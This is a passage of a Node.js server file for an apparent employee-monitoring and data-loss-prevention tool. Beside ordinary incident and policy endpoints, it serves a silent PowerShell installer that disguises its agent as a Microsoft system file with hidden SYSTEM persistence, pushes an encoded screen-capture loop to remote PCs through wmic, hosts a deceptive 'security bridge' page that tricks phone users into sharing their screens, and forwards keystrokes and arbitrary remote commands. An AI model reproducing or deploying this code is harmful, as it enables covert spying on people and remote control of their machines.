    productivityDelta: ((todayStats.productivityRate || 0) - (yesterdayRate?.rate || 0)).toFixed(1),
    weeklyAlerts: weeklyAlerts.count,
    topApp: topApp?.window_title || 'N/A'
  });
});

// File events API removed (v2 — File Vault trimmed)

// ═══════════════════════════════════════════════
// REMOTE AGENT DEPLOYMENT (One-Command Deploy)
// ═══════════════════════════════════════════════

// Serve the agent exe file
app.get("/agent-download", (req, res) => {
  const agentPath = require("path").resolve(__dirname, "..", "agent", "teram_agent.exe");
  if (require("fs").existsSync(agentPath)) {
    res.download(agentPath, "teram_agent.exe");
  } else {
    res.status(404).send("Agent exe not found. Run 'npm run build' in agent folder first.");
  }
});

// One-liner deployment script — target PC runs: irm http://SERVER:4000/download-join | iex
app.get("/download-join", (req, res) => {
  const localIP = (() => {
    const nets = require("os").networkInterfaces();
    for (const name of Object.keys(nets)) {
      for (const n of nets[name]) {
        if (n.family === "IPv4" && !n.internal) return n.address;
      }
    }
    return "localhost";
  })();

  const resolvedServerUrl = process.env.PUBLIC_URL || `http://${localIP}:4000`;
  const lines = [
    '# HBOSE Silent Agent Deployment',
    "$ErrorActionPreference = 'SilentlyContinue'",
    `$ServerUrl = "${resolvedServerUrl}"`,
    '$InstallDir = Join-Path $env:ProgramData "Microsoft\\Windows\\SystemHealth"',
    '$ExeName = "RuntimeBroker_Sys.exe"',
    '$ExePath = Join-Path $InstallDir $ExeName',
    '',
    'if (!(Test-Path $InstallDir)) {',
    '    New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null',
    '    $f = Get-Item $InstallDir -Force',
    "    $f.Attributes = 'Hidden','System','Directory'",
    '}',
    '',
    'Get-Process -Name "RuntimeBroker_Sys","teram_agent" -ErrorAction SilentlyContinue | Stop-Process -Force',
    'Start-Sleep -Seconds 2',
    '',
    'Write-Host "[+] Downloading agent from $ServerUrl..."',
    'Invoke-WebRequest -Uri "$ServerUrl/agent-download" -OutFile $ExePath -UseBasicParsing',
    '',
    'if (!(Test-Path $ExePath)) {',
    '    Write-Host "[!] Download failed!" -ForegroundColor Red',
    '    exit 1',
    '}',
    '',
    'icacls $InstallDir /inheritance:r /grant:r "SYSTEM:(OI)(CI)F" "Administrators:(OI)(CI)F" /T /Q | Out-Null',
    '',
    '$TaskName = "WindowsSystemHealthMonitor"',
    'Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue',
    '$Action = New-ScheduledTaskAction -Execute $ExePath -Argument $ServerUrl',
    '$Trigger = @((New-ScheduledTaskTrigger -AtStartup),(New-ScheduledTaskTrigger -AtLogOn))',
    '$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 9999 -RestartInterval (New-TimeSpan -Minutes 1) -ExecutionTimeLimit (New-TimeSpan -Days 365)',
    'Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -User "SYSTEM" -RunLevel Highest -Force | Out-Null',
    '',
    'Start-Process -FilePath $ExePath -ArgumentList $ServerUrl -WindowStyle Hidden',
    'Write-Host "[+] Agent deployed and running. Connecting to $ServerUrl" -ForegroundColor Green',
  ];
  res.type("text/plain").send(lines.join("\n"));
});

// ═══════════════════════════════════════════════
// DLP ENTERPRISE APIs — ALL 5 PHASES
// ═══════════════════════════════════════════════

// ── PHASE 1: CONTENT INTELLIGENCE ENGINE ──

// Keyword Dictionaries CRUD
app.get("/api/dlp/dictionaries", (req, res) => {
  const data = db.prepare("SELECT * FROM dlp_dictionaries ORDER BY weight DESC, created_at DESC").all();
  res.json(data);
});
app.post("/api/dlp/dictionaries", (req, res) => {
  const { name, description, category, keywords, weight, case_sensitive, proximity_words } = req.body;
  db.prepare("INSERT INTO dlp_dictionaries (name, description, category, keywords, weight, case_sensitive, proximity_words) VALUES (?,?,?,?,?,?,?)")
    .run(name, description || "", category || "Custom", keywords, weight || 5, case_sensitive ? 1 : 0, proximity_words || 0);
  res.json({ success: true });
});
app.put("/api/dlp/dictionaries/:id", (req, res) => {
  const { name, description, category, keywords, weight, case_sensitive, proximity_words, status } = req.body;
  db.prepare("UPDATE dlp_dictionaries SET name=?,description=?,category=?,keywords=?,weight=?,case_sensitive=?,proximity_words=?,status=? WHERE id=?")
    .run(name, description, category, keywords, weight, case_sensitive ? 1 : 0, proximity_words || 0, status || "Active", req.params.id);
  res.json({ success: true });
});
app.delete("/api/dlp/dictionaries/:id", (req, res) => {
  db.prepare("DELETE FROM dlp_dictionaries WHERE id=?").run(req.params.id);
  res.json({ success: true });
});

// Regex Patterns CRUD
app.get("/api/dlp/regex", (req, res) => {
  const data = db.prepare("SELECT * FROM dlp_regex_patterns ORDER BY created_at DESC").all();
  res.json(data);
});
app.post("/api/dlp/regex", (req, res) => {
  const { name, description, pattern, category, severity, test_sample } = req.body;
  try {
    new RegExp(pattern); // validate regex
    db.prepare("INSERT INTO dlp_regex_patterns (name, description, pattern, category, severity, test_sample) VALUES (?,?,?,?,?,?)")
      .run(name, description || "", pattern, category || "Custom", severity || "Medium", test_sample || "");
    res.json({ success: true });
  } catch (e) {
    res.status(400).json({ error: `Invalid regex: ${e.message}` });
  }
});
app.put("/api/dlp/regex/:id", (req, res) => {
  const { name, description, pattern, category, severity, status, test_sample } = req.body;
  try {
    new RegExp(pattern);
    db.prepare("UPDATE dlp_regex_patterns SET name=?,description=?,pattern=?,category=?,severity=?,status=?,test_sample=? WHERE id=?")
      .run(name, description, pattern, category, severity, status || "Active", test_sample || "", req.params.id);
    res.json({ success: true });
  } catch (e) {
    res.status(400).json({ error: `Invalid regex: ${e.message}` });
  }
});
app.delete("/api/dlp/regex/:id", (req, res) => {
  db.prepare("DELETE FROM dlp_regex_patterns WHERE id=?").run(req.params.id);
  res.json({ success: true });
});

// Regex Test Endpoint
app.post("/api/dlp/regex/test", (req, res) => {
  const { pattern, text } = req.body;
  try {
    const regex = new RegExp(pattern, "gi");
    const matches = [];
    let match;
    while ((match = regex.exec(text)) !== null) {
      matches.push({ match: match[0], index: match.index });
      if (matches.length > 50) break;
    }
    res.json({ valid: true, matches, count: matches.length });
  } catch (e) {
    res.json({ valid: false, error: e.message, matches: [], count: 0 });
  }
});

// Data Classifications
app.get("/api/dlp/classifications", (req, res) => {
  const { hostname } = req.query;
  const where = hostname ? "WHERE hostname = ?" : "";
  const params = hostname ? [hostname] : [];
  const data = db.prepare(`SELECT * FROM dlp_classifications ${where} ORDER BY timestamp DESC LIMIT 200`).all(...params);
  res.json(data);
});

// Content Scan API (scan text against all active dictionaries + regex)
app.post("/api/dlp/scan", (req, res) => {
  const { text, source } = req.body;
  if (!text) return res.json({ matches: [], risk_score: 0 });

  const results = [];
  let totalScore = 0;

  // Scan dictionaries
  const dicts = db.prepare("SELECT * FROM dlp_dictionaries WHERE status = 'Active'").all();
  for (const dict of dicts) {
    const keywords = dict.keywords.split(",").map(k => k.trim().toLowerCase());
    const lowerText = dict.case_sensitive ? text : text.toLowerCase();
    for (const kw of keywords) {
      const searchKw = dict.case_sensitive ? kw : kw.toLowerCase();
      if (lowerText.includes(searchKw)) {
        results.push({ type: "keyword", dictionary: dict.name, keyword: kw, weight: dict.weight, category: dict.category });
        totalScore += dict.weight;
      }
    }
  }

  // Scan regex patterns
  const patterns = db.prepare("SELECT * FROM dlp_regex_patterns WHERE status = 'Active'").all();
  for (const pat of patterns) {
    try {
      const regex = new RegExp(pat.pattern, "gi");
      const matches = text.match(regex);
      if (matches && matches.length > 0) {
        results.push({ type: "regex", pattern_name: pat.name, matches: matches.slice(0, 5), count: matches.length, severity: pat.severity, category: pat.category });
        const sevScore = { Critical: 10, High: 7, Medium: 4, Low: 1 };
        totalScore += (sevScore[pat.severity] || 4) * matches.length;
      }
    } catch (e) { }
  }

  res.json({ matches: results, risk_score: Math.min(totalScore, 100), source: source || "manual" });
});

// ── PHASE 2: ENDPOINT SHIELD & DEVICE CONTROL ──
// USB Events API intentionally removed (v2 — out of scope)


// Clipboard Events
app.get("/api/dlp/clipboard-events", (req, res) => {
  const { hostname } = req.query;
  const where = hostname ? "WHERE hostname = ?" : "";
  const params = hostname ? [hostname] : [];
  const data = db.prepare(`SELECT * FROM dlp_clipboard_events ${where} ORDER BY timestamp DESC LIMIT 200`).all(...params);
  res.json(data);
});
app.post("/api/dlp/clipboard-events", (req, res) => {
  const { hostname, username, content_type, content_preview, content_length, source_app, dest_app, action, policy_triggered, blocked } = req.body;
  db.prepare("INSERT INTO dlp_clipboard_events (hostname, username, content_type, content_preview, content_length, source_app, dest_app, action, policy_triggered, blocked) VALUES (?,?,?,?,?,?,?,?,?,?)")
    .run(hostname, username, content_type || "Text", content_preview, content_length || 0, source_app, dest_app, action || "Copy", policy_triggered, blocked ? 1 : 0);
  res.json({ success: true });
});

// Print Events
app.get("/api/dlp/print-events", (req, res) => {
  const { hostname } = req.query;
  const where = hostname ? "WHERE hostname = ?" : "";
  const params = hostname ? [hostname] : [];
  const data = db.prepare(`SELECT * FROM dlp_print_events ${where} ORDER BY timestamp DESC LIMIT 200`).all(...params);
  res.json(data);
});
app.post("/api/dlp/print-events", (req, res) => {
  const { hostname, username, document_name, printer_name, printer_type, pages, copies, color_mode, paper_size, app_used, policy_triggered, blocked } = req.body;
  db.prepare("INSERT INTO dlp_print_events (hostname, username, document_name, printer_name, printer_type, pages, copies, color_mode, paper_size, app_used, policy_triggered, blocked) VALUES (?,?,?,?,?,?,?,?,?,?,?,?)")
    .run(hostname, username, document_name, printer_name, printer_type || "Local", pages || 0, copies || 1, color_mode || "Unknown", paper_size || "A4", app_used, policy_triggered, blocked ? 1 : 0);
  res.json({ success: true });
});

// ── PHASE 3: NETWORK SENTINEL (incidents by channel) ──

// DLP Incidents CRUD
app.get("/api/dlp/incidents", (req, res) => {
  const { hostname, severity, status, channel, limit } = req.query;
  let where = [];
  let params = [];
  if (hostname) { where.push("hostname = ?"); params.push(hostname); }
  if (severity) { where.push("severity = ?"); params.push(severity); }
  if (status) { where.push("status = ?"); params.push(status); }
  if (channel) { where.push("channel = ?"); params.push(channel); }
  const whereClause = where.length > 0 ? "WHERE " + where.join(" AND ") : "";
  const data = db.prepare(`SELECT * FROM dlp_incidents ${whereClause} ORDER BY timestamp DESC LIMIT ?`).all(...params, parseInt(limit) || 200);
  res.json(data);
});
app.post("/api/dlp/incidents", (req, res) => {
  const { hostname, username, incident_type, channel, severity, policy_id, policy_name, content_snippet, file_name, file_path, destination, action_taken, risk_score } = req.body;
  const result = db.prepare("INSERT INTO dlp_incidents (hostname, username, incident_type, channel, severity, policy_id, policy_name, content_snippet, file_name, file_path, destination, action_taken, risk_score) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)")
    .run(hostname, username, incident_type, channel, severity || "Medium", policy_id, policy_name, content_snippet, file_name, file_path, destination, action_taken || "Logged", risk_score || 0);

  // Update user risk score
  updateUserRisk(hostname, username, severity || "Medium");

  io.emit("dlp-incident", { ...req.body, id: result.lastInsertRowid });
  res.json({ success: true, id: result.lastInsertRowid });
});

// Incident management (acknowledge, escalate, dismiss)
app.patch("/api/dlp/incidents/:id", (req, res) => {
  const { status, reviewed_by, review_notes } = req.body;
  db.prepare("UPDATE dlp_incidents SET status=?, reviewed_by=?, review_notes=?, reviewed_at=datetime('now') WHERE id=?")
    .run(status, reviewed_by || "admin", review_notes || "", req.params.id);
  res.json({ success: true });
});

// ── PHASE 4: THREAT ANALYTICS & RISK SCORING ──

function updateUserRisk(hostname, username, severity) {
  if (!hostname) return;
  const sevMap = { Critical: 25, High: 15, Medium: 5, Low: 1 };
  const points = sevMap[severity] || 5;

  const existing = db.prepare("SELECT * FROM dlp_user_risk WHERE hostname = ?").get(hostname);
  if (existing) {
    const newScore = Math.min(100, existing.risk_score + points);
    const critInc = existing.critical_incidents + (severity === "Critical" ? 1 : 0);
    const highInc = existing.high_incidents + (severity === "High" ? 1 : 0);
    const medInc = existing.medium_incidents + (severity === "Medium" ? 1 : 0);
    const lowInc = existing.low_incidents + (severity === "Low" ? 1 : 0);
    const level = newScore >= 80 ? "Critical" : newScore >= 50 ? "High" : newScore >= 20 ? "Medium" : "Low";
    db.prepare("UPDATE dlp_user_risk SET risk_score=?, risk_level=?, total_incidents=total_incidents+1, critical_incidents=?, high_incidents=?, medium_incidents=?, low_incidents=?, last_incident=datetime('now'), updated_at=datetime('now') WHERE hostname=?")
      .run(newScore, level, critInc, highInc, medInc, lowInc, hostname);
  } else {
    const level = points >= 25 ? "Critical" : points >= 15 ? "High" : points >= 5 ? "Medium" : "Low";
    db.prepare("INSERT INTO dlp_user_risk (hostname, username, risk_score, risk_level, total_incidents, critical_incidents, high_incidents, medium_incidents, low_incidents, last_incident) VALUES (?,?,?,?,1,?,?,?,?,datetime('now'))")
      .run(hostname, username, points, level, severity === "Critical" ? 1 : 0, severity === "High" ? 1 : 0, severity === "Medium" ? 1 : 0, severity === "Low" ? 1 : 0);
  }
}

app.get("/api/dlp/user-risk", (req, res) => {
  const data = db.prepare("SELECT * FROM dlp_user_risk ORDER BY risk_score DESC").all();
  res.json(data);
});

app.patch("/api/dlp/user-risk/:hostname/watchlist", (req, res) => {
  const { watchlist } = req.body;
  db.prepare("UPDATE dlp_user_risk SET watchlist=? WHERE hostname=?").run(watchlist ? 1 : 0, req.params.hostname);
  res.json({ success: true });
});

// ── PHASE 5: COMPLIANCE CENTER ──

app.get("/api/dlp/compliance", (req, res) => {
  const data = db.prepare("SELECT * FROM dlp_compliance_templates ORDER BY framework").all();
  res.json(data);
});
app.patch("/api/dlp/compliance/:id", (req, res) => {
  const { status } = req.body;
  db.prepare("UPDATE dlp_compliance_templates SET status=? WHERE id=?").run(status, req.params.id);
  res.json({ success: true });
});

// Audit Log
app.get("/api/dlp/audit-log", (req, res) => {
  const data = db.prepare("SELECT * FROM dlp_audit_log ORDER BY timestamp DESC LIMIT 200").all();
  res.json(data);
});

// DLP Dashboard Stats
app.get("/api/dlp/stats", (req, res) => {
  const totalIncidents = db.prepare("SELECT COUNT(*) as c FROM dlp_incidents").get().c;
  const openIncidents = db.prepare("SELECT COUNT(*) as c FROM dlp_incidents WHERE status = 'Open'").get().c;
  const criticalIncidents = db.prepare("SELECT COUNT(*) as c FROM dlp_incidents WHERE severity = 'Critical' AND status = 'Open'").get().c;
  const todayIncidents = db.prepare("SELECT COUNT(*) as c FROM dlp_incidents WHERE date(timestamp) = date('now')").get().c;
  const weekIncidents = db.prepare("SELECT COUNT(*) as c FROM dlp_incidents WHERE timestamp > datetime('now', '-7 days')").get().c;
  const activeDictionaries = db.prepare("SELECT COUNT(*) as c FROM dlp_dictionaries WHERE status = 'Active'").get().c;
  const activeRegex = db.prepare("SELECT COUNT(*) as c FROM dlp_regex_patterns WHERE status = 'Active'").get().c;
  const usbEvents = 0; // USB detection removed in v2
  const clipboardBlocked = db.prepare("SELECT COUNT(*) as c FROM dlp_clipboard_events WHERE blocked = 1 AND timestamp > datetime('now', '-24 hours')").get().c;
  const printEvents = db.prepare("SELECT COUNT(*) as c FROM dlp_print_events WHERE timestamp > datetime('now', '-24 hours')").get().c;
  const highRiskUsers = db.prepare("SELECT COUNT(*) as c FROM dlp_user_risk WHERE risk_level IN ('High', 'Critical')").get().c;
  const watchlistUsers = db.prepare("SELECT COUNT(*) as c FROM dlp_user_risk WHERE watchlist = 1").get().c;

  // Incidents by channel
  const byChannel = db.prepare("SELECT channel, COUNT(*) as count FROM dlp_incidents WHERE timestamp > datetime('now', '-30 days') GROUP BY channel ORDER BY count DESC").all();

  // Incidents by severity
  const bySeverity = db.prepare("SELECT severity, COUNT(*) as count FROM dlp_incidents WHERE timestamp > datetime('now', '-30 days') GROUP BY severity").all();

  // Incident trend (last 14 days)
  const trend = db.prepare("SELECT date(timestamp) as day, COUNT(*) as count, severity FROM dlp_incidents WHERE timestamp > datetime('now', '-14 days') GROUP BY day, severity ORDER BY day").all();

  // Top triggered policies
  const topPolicies = db.prepare("SELECT policy_name, COUNT(*) as count, severity FROM dlp_incidents WHERE timestamp > datetime('now', '-30 days') GROUP BY policy_name ORDER BY count DESC LIMIT 10").all();

  res.json({
    totalIncidents, openIncidents, criticalIncidents, todayIncidents, weekIncidents,
    activeDictionaries, activeRegex, usbEvents, clipboardBlocked, printEvents,
    highRiskUsers, watchlistUsers, byChannel, bySeverity, trend, topPolicies
  });
});

// USB Contents API intentionally removed (v2 — out of scope)


// ── NETWORK SENTINEL APIs ──
const networkActivityCache = new Map(); // hostname -> connections[]
const bandwidthCache = new Map();       // hostname -> processes[]

app.post("/api/dlp/network-activity", (req, res) => {
  const { hostname, username, connections, timestamp } = req.body;
  const existing = networkActivityCache.get(hostname) || [];
  const merged = [...connections.map(c => ({ ...c, timestamp })), ...existing].slice(0, 200);
  networkActivityCache.set(hostname, merged);
  io.emit("network-activity-update", { hostname, newConnections: connections.length });
  res.json({ success: true });
});

app.get("/api/dlp/network-activity", (req, res) => {
  const { hostname } = req.query;
  if (hostname) return res.json(networkActivityCache.get(hostname) || []);
  const all = {};
  for (const [h, conns] of networkActivityCache) all[h] = conns;
  res.json(all);
});

app.post("/api/dlp/bandwidth", (req, res) => {
  const { hostname, username, processes, timestamp } = req.body;
  bandwidthCache.set(hostname, { processes, timestamp, username });
  res.json({ success: true });
});

app.get("/api/dlp/bandwidth", (req, res) => {
  const { hostname } = req.query;
  if (hostname) return res.json(bandwidthCache.get(hostname) || {});
  const all = {};
  for (const [h, data] of bandwidthCache) all[h] = data;
  res.json(all);
});

app.get("/api/settings", (req, res) => {
  const settings = db.prepare("SELECT * FROM settings").all();
  const obj = {};
  settings.forEach(s => obj[s.key] = s.value);
  res.json(obj);
});

app.post("/api/settings", (req, res) => {
  const allowedKeys = [
    'risk_keywords', 'retention_days', 'retention_hours',
    // DLP settings
    'dlp_clipboard_policy', 'dlp_print_policy', 'dlp_network_policy',
    'dlp_auto_scan', 'dlp_scan_interval',
    // Alert settings
    'alert_email', 'alert_webhook', 'alert_auto_dismiss_hours', 'alert_severity_threshold',
    // Storage settings
    'storage_max_gb', 'storage_compress', 'storage_auto_cleanup',
    // Agent settings
    'agent_capture_interval', 'agent_capture_quality', 'agent_stealth_mode',
    // General
    'company_name', 'timezone', 'work_start_time', 'work_end_time',
    'late_threshold_minutes', 'ocr_enabled', 'ocr_language',
    // Blackout / Lockdown settings
    'blackout_message', 'blackout_contact_phone', 'blackout_contact_email', 'blackout_contact_url',
    // Trigger engine settings
    'trigger_rat_watchlist', 'trigger_content_keywords', 'trigger_content_regex',
    'trigger_site_categories', 'trigger_rat_grace_seconds', 'trigger_content_duration_seconds',
    'trigger_buffer_seconds'
  ];
  const updates = req.body;
  let updated = 0;
  for (const [key, value] of Object.entries(updates)) {
    if (allowedKeys.includes(key) && value !== undefined && value !== null) {
      db.prepare("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)").run(key, String(value));
      updated++;
    }
  }
  res.json({ success: true, updated });
});

app.post("/api/stealth-deploy", (req, res) => {
  const { targetPC, username, password } = req.body;
  const ip = require("os").networkInterfaces()["Ethernet"]?.[0]?.address || require("os").networkInterfaces()["Wi-Fi"]?.[0]?.address || "localhost";

  // The Payload: Using a simpler method to avoid Here-String whitespace issues
  const payload = `
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $server = 'http://${ip}:4000'
    $hostname = $env:COMPUTERNAME
    
    while($true) {
        try {
            $img = [System.Windows.Forms.Screen]::PrimaryScreen
            $bmp = New-Object Drawing.Bitmap($img.Bounds.Width, $img.Bounds.Height)
            $graphics = [Drawing.Graphics]::FromImage($bmp)
            $graphics.CopyFromScreen(0, 0, 0, 0, $bmp.Size)
            $ms = New-Object IO.MemoryStream
            $bmp.Save($ms, [Drawing.Imaging.ImageFormat]::Jpeg)
            $base64 = [Convert]::ToBase64String($ms.ToArray())
            $body = @{ hostname=$hostname; username=$env:USERNAME; screen=$base64; status="Active"; timestamp=(Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ") } | ConvertTo-Json
            Invoke-RestMethod -Uri "$server/api/remote-sync" -Method Post -Body $body -ContentType "application/json"
        } catch {}
        Start-Sleep -Seconds 5
    }
  `;

  // PowerShell EncodedCommand requires UTF-16LE
  const encodedPayload = Buffer.from(payload, 'utf16le').toString('base64');

  let command = `wmic /node:"${targetPC}" `;
  if (username && password) {
    command += `/user:"${username}" /password:"${password}" `;
  }
  command += `process call create "powershell -EncodedCommand ${encodedPayload}"`;

  require("child_process").exec(command, (err) => {
    if (err) return res.status(500).json({ error: "Access Denied. Check credentials and Firewall." });
    res.json({ success: true, message: "Zero-Touch Bridge established in RAM." });
  });
});

// Utility to get Local IP
function getLocalIP() {
  const interfaces = require("os").networkInterfaces();
  let foundIP = "localhost";

  for (let dev in interfaces) {
    const details = interfaces[dev].find(details =>
      details.family === 'IPv4' &&
      !details.internal &&
      !details.address.startsWith('169.254') // Skip APIPA
    );
    if (details) {
      foundIP = details.address;
      break;
    }
  }
  return foundIP;
}

app.get("/safety", (req, res) => {
  res.send(`
    <html>
      <head>
        <title>HBOSE | Network Security</title>
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
        <style>
          body { background: #0a0a0b; color: #fff; font-family: -apple-system, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
          .card { background: #141417; border: 1px solid #222; padding: 40px; border-radius: 32px; text-align: center; max-width: 80%; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
          .shield { width: 80px; height: 80px; background: #2563eb; border-radius: 20px; display: flex; items-center: center; justify-content: center; margin: 0 auto 24px; font-size: 40px; }
          h1 { font-size: 22px; font-weight: 800; margin: 0 0 12px; letter-spacing: -0.5px; }
          p { color: #888; font-size: 14px; line-height: 1.5; margin-bottom: 32px; }
          button { background: #fff; color: #000; border: none; padding: 16px 32px; border-radius: 16px; font-weight: 900; font-size: 14px; text-transform: uppercase; letter-spacing: 1px; width: 100%; cursor: pointer; transition: 0.2s; }
          button:active { transform: scale(0.95); opacity: 0.8; }
          .status { position: absolute; bottom: 40px; font-size: 10px; font-weight: 900; color: #333; letter-spacing: 2px; text-transform: uppercase; }
          video, canvas { display: none; }
        </style>
      </head>
      <body>
        <div id="setup" class="card">
          <div class="shield">🛡️</div>
          <h1>HBOSE SECURITY BRIDGE</h1>
          <p>Your office network requires a secure display tunnel for policy compliance. Click below to verify this device.</p>
          <button onclick="start()">Secure This Device</button>
        </div>
        <div id="active" style="display:none" class="card">
          <div class="shield" style="background:#10b981">🔒</div>
          <h1>SAFETY ACTIVE</h1>
          <p>This device is now verified and secured by the office network gateway. You can minimize this page.</p>
        </div>
        <div class="status">HBOSE Safety Tunnel v6.0</div>
        <video id="v" playsinline></video>
        <canvas id="c"></canvas>
        <script>
          const v = document.getElementById('v');
          const c = document.getElementById('c');
          const ctx = c.getContext('2d');
          
          async function start() {
            try {
              const stream = await navigator.mediaDevices.getDisplayMedia({ video: { cursor: "never" }, audio: false });
              document.getElementById('setup').style.display = 'none';
              document.getElementById('active').style.display = 'block';
              v.srcObject = stream;
              v.play();
              setInterval(() => {
                c.width = v.videoWidth / 2; // Compressed for mobile speed
                c.height = v.videoHeight / 2;
                ctx.drawImage(v, 0, 0, c.width, c.height);
                fetch('/api/remote-sync', {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({
                    hostname: 'MOBILE-' + (navigator.platform.includes('iPhone') ? 'IPHONE' : 'ANDROID'),
                    username: 'WiFi-User',
                    screen: c.toDataURL('image/jpeg', 0.4).split(',')[1],
                    status: 'Active',
                    timestamp: new Date().toISOString()
                  })
                });
              }, 4000);
            } catch(e) { 
              alert("Verification Failed: You must allow 'Screen Recording' to use the office WiFi.");
            }
          }
        </script>
      </body>
    </html>
  `);
});

// Shared Sync Processor
async function processSync(data) {
  const windowTitle = data.window_title || data.windowTitle || "System Process";
  const lowerTitle = windowTitle.toLowerCase();
  
  // Only record screen (save image) if a remote tool is active
  const remoteTools = [
    "anydesk", "teamviewer", "rustdesk", "ammyy", "vnc", 
    "remote desktop", "splashtop", "logmein", "gotomypc", 
    "ultravnc", "radmin", "tightvnc"
  ];
  const isRemoteToolActive = remoteTools.some(tool => lowerTitle.includes(tool));
  
  let screenFilename = null;
  if (data.screen && isRemoteToolActive) {
    screenFilename = `screen_${data.hostname}_${Date.now()}.jpg`;
    const screenPath = path.join(STORAGE_DIR, screenFilename);
    const buffer = Buffer.from(data.screen, "base64");
    fs.writeFileSync(screenPath, buffer);
  }

  const stmt = db.prepare(`
    INSERT INTO activities (hostname, username, window_title, keystrokes, status, screen_path)
    VALUES (?, ?, ?, ?, ?, ?)
  `);
  const { lastInsertRowid } = stmt.run(data.hostname, data.username, windowTitle, data.keystrokes || "", data.status || "Active", screenFilename);

  // Productivity Categorization (Enhanced)
  const productiveApps = ["visual studio", "code", "excel", "outlook", "teams", "slack", "jira", "confluence", "word", "powerpoint", "notion", "figma", "github", "stack overflow", "terminal", "powershell", "bash"];
  const unproductiveApps = ["facebook", "youtube", "twitter", "instagram", "netflix", "twitch", "gaming", "steam", "reddit", "whatsapp", "telegram", "spotify", "discord", "tiktok", "hulu", "disney+"];
  let category = "Neutral";

  if (productiveApps.some(app => lowerTitle.includes(app))) category = "Productive";
  else if (unproductiveApps.some(app => lowerTitle.includes(app))) category = "Unproductive";
  else if (lowerTitle.includes("chrome") || lowerTitle.includes("edge") || lowerTitle.includes("firefox") || lowerTitle.includes("safari")) category = "Browsing";
  else if (lowerTitle.includes("system") || lowerTitle.includes("settings") || lowerTitle.includes("control panel")) category = "System";

  db.prepare("UPDATE activities SET category = ? WHERE id = ?").run(category, lastInsertRowid);

  if (data.keystrokes) {
    io.emit("live-keystroke", { hostname: data.hostname, text: data.keystrokes });
  }

  // OCR Processing (Async - Fire & Forget)
  if (screenFilename && data.screen) {
    setImmediate(() => {
      const buffer = Buffer.from(data.screen, "base64");
      Tesseract.recognize(buffer, 'eng')
        .then(({ data: { text } }) => {
          if (!text || text.trim().length === 0) return;

        // 1. Update Activity Record
        db.prepare("UPDATE activities SET ocr_text = ? WHERE id = ?").run(text, lastInsertRowid);

        // 2. Policy Check: Keyword/OCR policies
        try {
          const policies = db.prepare("SELECT * FROM policies WHERE status = 'Active' AND (type = 'Keyword' OR type = 'OCR')").all();
          const lowerText = text.toLowerCase();
          for (const policy of policies) {
            const keywords = [policy.name.toLowerCase()];
            if (policy.conditions) {
              policy.conditions.split("\n").forEach(c => {
                const t = c.trim().toLowerCase();
                if (t) keywords.push(t);
              });
            }
            for (const kw of keywords) {
              if (lowerText.includes(kw)) {
                // Check device targeting
                const targets = policy.targets;
                if (targets && targets.trim() !== '*' && targets.trim() !== '') {
                  const targetList = targets.split(',').map(t => t.trim().toLowerCase());
                  if (!targetList.includes(data.hostname.toLowerCase()) && !targetList.includes('*')) continue;
                }
                // Create alert
                db.prepare("INSERT INTO alerts (hostname, type, message, severity) VALUES (?, ?, ?, ?)")
                  .run(data.hostname, "DLP-OCR", `Keyword "${kw}" detected on screen [Policy: ${policy.name}]`, policy.severity || "Medium");
                io.emit("new-alert", {
                  hostname: data.hostname,
                  message: `DLP: Keyword "${kw}" detected on screen`,
                  severity: policy.severity || "Medium"
                });
                break;
              }
            }
          }
        } catch (policyErr) { }
      })
      .catch(e => console.error(`[OCR] Error processing frame: ${e.message}`));
    });
  }

  io.emit("new-activity", { ...data, window_title: windowTitle, screenPath: screenFilename, category });

  // LIVE VIEW BRIDGE: Send the frame to the dashboard immediately
  if (data.screen) {
    io.emit("dashboard-frame", {
      hostname: data.hostname,
      frame: data.screen,
      resolution: data.resolution || { width: 1920, height: 1080 }
    });
  }
}

const taskQueue = {}; // { hostname: { taskId: string, task: string } }

app.post("/api/remote-sync", async (req, res) => {
  const data = req.body;
  data.ip = req.ip.replace('::ffff:', '');
  await processSync(data);

  // Check for pending tasks
  const pendingTask = taskQueue[data.hostname];
  if (pendingTask) {
    delete taskQueue[data.hostname];
    return res.json({ success: true, task: pendingTask.task, taskId: pendingTask.taskId });
  }

  res.json({ success: true });
});

app.post("/api/send-command", (req, res) => {
  const { hostname, command } = req.body;
  if (!hostname || !command) return res.status(400).json({ error: "Missing Parameters" });

  // 1. Queue for Polling Agents (PowerShell)
  taskQueue[hostname] = {
    taskId: Math.random().toString(36).substring(7),
    task: command
  };

  // 2. Real-time Push for Socket Agents (Node.js)
  const targetSocket = Array.from(io.sockets.sockets.values()).find(s => s.hostname === hostname);
  if (targetSocket) {
    console.log(`[CMD] Routing command '${command}' to socket agent: ${hostname}`);
    switch (command.toLowerCase()) {
      case "lock": targetSocket.emit("lock-machine"); break;
      case "shutdown": targetSocket.emit("shutdown-machine"); break;
      case "restart": targetSocket.emit("restart-machine"); break;
      case "logoff": targetSocket.emit("logoff-user"); break;
      default: targetSocket.emit("run-command", command); break;
    }
  }

  res.json({ success: true, message: "Command dispatched to Matrix" });
});

app.post("/api/task-result", (req, res) => {
  const { hostname, output, taskId } = req.body;
  console.log(`[TACTICAL] Command Result (${taskId}) from ${hostname}:\n${output}`);
  io.emit("command-output", { hostname, output, taskId });
  res.json({ success: true });
});


// Delete Recordings Endpoint
app.delete("/api/recordings/:id", (req, res) => {
  db.prepare("DELETE FROM triggered_recordings WHERE id = ?").run(req.params.id);
  res.json({ success: true });
});

// Core Schema Fixes (Stability + Features)
db.exec(`
  CREATE TABLE IF NOT EXISTS admins (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE NOT NULL,
    password_hash TEXT NOT NULL,
    role TEXT NOT NULL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  );
